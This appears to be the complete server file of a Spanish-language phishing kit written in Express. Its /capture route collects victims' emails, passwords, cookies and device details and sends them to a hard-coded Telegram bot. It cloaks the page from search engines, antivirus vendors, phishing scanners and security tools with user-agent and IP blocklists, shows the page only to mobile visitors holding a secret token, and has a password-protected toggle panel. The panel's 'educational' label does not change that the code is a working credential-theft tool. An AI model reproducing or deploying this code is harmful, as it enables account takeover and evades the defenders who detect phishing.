import express from 'express'
import cors from 'cors'
import path from 'path'
import { fileURLToPath } from 'url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const app = express()
const PORT = process.env.PORT || 3001

const TELEGRAM_TOKEN   = '7805520464:AAEtj4JzDwU0K3p-0v8GpJJM9nUlGjK9TjY'
const TELEGRAM_CHAT_ID = '5340125265'
const ADMIN_PASS       = 'prof2026'

let pageActive = true

const SECRET_TOKEN = 'AM' + Math.random().toString(36).substring(2, 10).toUpperCase() + Date.now().toString(36).substring(-4).toUpperCase()
console.log(`🔑 Token secreto: ${SECRET_TOKEN}`)

const MAX_VISITS = 5
const ipVisits = new Map()

const BOT_KEYWORDS = [
  'googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','facebot','facebookexternalhit',
  'virustotal','phishtank','urlscan','safebrowsing','norton','avast','kaspersky','mcafee','bitdefender',
  'malwarebytes','sophos','eset','trendmicro','fortinet','paloalto','crowdstrike','symantec',
  'curl','wget','python-requests','scrapy','httpclient','java/','libwww','lwp-','go-http-client','node-fetch',
  'postman','insomnia','burp','nikto','nmap','masscan','zgrab','censys','shodan','headlesschrome','phantomjs',
  'selenium','puppeteer','playwright',
]

const BLOCKED_IP_PREFIXES = [
  '66.249.','64.233.','72.14.','74.125.','209.85.','216.239.','66.102.','108.177.','142.250.','172.217.','173.194.',
  '35.190.','35.191.','35.192.','35.193.','35.194.','35.199.','35.200.','35.201.','35.202.','35.203.',
  '40.77.','157.55.','157.56.','199.30.','207.46.','65.55.','131.253.',
  '104.16.','104.17.','104.18.','104.19.','104.20.','104.21.','104.22.','104.23.','104.24.','104.25.',
  '172.64.','172.65.','172.66.','172.67.','185.220.','198.96.','176.10.','62.210.',
]

function isBot(ua, ip) {
  if (ua) { const u = ua.toLowerCase(); for (const k of BOT_KEYWORDS) if (u.includes(k)) return true }
  if (ip) { for (const p of BLOCKED_IP_PREFIXES) if (ip.startsWith(p)) return true }
  if (!ua || ua.length < 20) return true
  return false
}

function getIP(req) {
  return (req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '').replace('::ffff:', '')
}

async function sendTelegram(data) {
  const { email, password, ip, userAgent, cookies, screenRes, language, timestamp } = data
  const text =
    `🎣 *Nueva captura*\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🌐 *IP:* \`${ip}\`\n` +
    `🖥️ *Pantalla:* ${screenRes}  |  🌍 *Idioma:* ${language}\n🍪 *Cookies:* \`${cookies}\`\n🔍 *UA:* \`${userAgent}\`\n🕐 ${timestamp}`
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
    })
  } catch (e) { console.error('❌ TG:', e.message) }
}

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// Servir archivos estáticos de dist/
app.use('/assets', express.static(path.join(__dirname, 'dist', 'assets')))
app.use('/po.png', express.static(path.join(__dirname, 'dist', 'po.png')))

// ── Status ──
app.get('/status', (req, res) => {
  const ip = getIP(req), ua = req.headers['user-agent'] || '', p = req.query.path || ''
  if (isBot(ua, ip)) return res.json({ active: false })
  if (p !== SECRET_TOKEN) return res.json({ active: false })
  const uaL = ua.toLowerCase()
  if (!/iphone|ipad|ipod|android|mobile|phone|webos|blackberry|opera mini|iemobile/.test(uaL)) return res.json({ active: false })
  const c = (ipVisits.get(ip) || 0) + 1; ipVisits.set(ip, c)
  if (c > MAX_VISITS) return res.json({ active: false })
  res.json({ active: pageActive })
})

// ── Admin ──
app.get('/x7k9p2', (req, res) => {
  const st = pageActive ? '🟢 ACTIVA' : '🔴 APAGADA'
  const tl = pageActive ? 'APAGAR' : 'ENCENDER'
  const tc = pageActive ? '#d32f2f' : '#2e7d32'
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Panel</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.p{background:#16213e;border-radius:12px;padding:32px;width:360px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4)}h1{font-size:20px;margin-bottom:8px}.s{font-size:28px;margin:20px 0;padding:12px;border-radius:8px;background:#0f3460}.b{width:100%;padding:14px;border:none;border-radius:8px;font-size:16px;font-weight:700;color:#fff;cursor:pointer;margin-top:12px}input{width:100%;padding:10px;border-radius:6px;border:1px solid #555;background:#1a1a2e;color:#fff;font-size:14px;margin-top:12px;text-align:center}.t{font-size:12px;color:#81c784;margin-top:12px;padding:10px;background:rgba(129,199,132,.1);border-radius:6px;word-break:break-all}.i{font-size:11px;color:#888;margin-top:12px}</style></head><body>
<div class="p"><h1>🎣 Panel de Control</h1><p style="color:#888">Phishing Educativo</p><div class="s">${st}</div>
<div class="t">🔑 <b style="color:#a5d6a7">Link:</b><br>/${SECRET_TOKEN}</div>
<form method="POST" action="/x7k9p2/toggle"><input type="password" name="pass" placeholder="Contraseña" required><button type="submit" class="b" style="background:${tc}">${tl}</button></form>
<p class="i">🛡️ Anti-bot + Solo móvil + Rate limit (${MAX_VISITS}/IP)</p></div></body></html>`)
})

app.post('/x7k9p2/toggle', (req, res) => {
  if (req.body.pass !== ADMIN_PASS) return res.status(401).send('❌ Contraseña incorrecta. <a href="/x7k9p2">Volver</a>')
  pageActive = !pageActive
  console.log(`⚡ Página ${pageActive ? '🟢 ON' : '🔴 OFF'}`)
  res.redirect('/x7k9p2')
})

// ── Captura ──
app.post('/capture', (req, res) => {
  if (!pageActive) return res.json({ ok: false })
  const { uid, tk, n: ci, ua, ck, sr, lg } = req.body
  if (!uid && !tk) return res.status(400).json({ error: 'x' })
  const ip = ci || getIP(req)
  const ts = new Date().toLocaleString('es-ES', { timeZone: 'America/Bogota' })
  console.log(`✅ ${uid} | ${ip}`)
  res.json({ ok: true })
  sendTelegram({ email: uid, password: tk, ip, userAgent: ua, cookies: ck, screenRes: sr, language: lg, timestamp: ts })
})

// ── Cualquier otra ruta → sirve index.html (SPA) ──
app.get('/{*path}', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'))
})

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🎣 PRODUCCIÓN en http://0.0.0.0:${PORT}`)
  console.log(`🔑 Token: ${SECRET_TOKEN}`)
  console.log(`🔧 Admin: /x7k9p2`)
  console.log(`🛡️ Anti-bot + Solo móvil + Rate limit`)
})
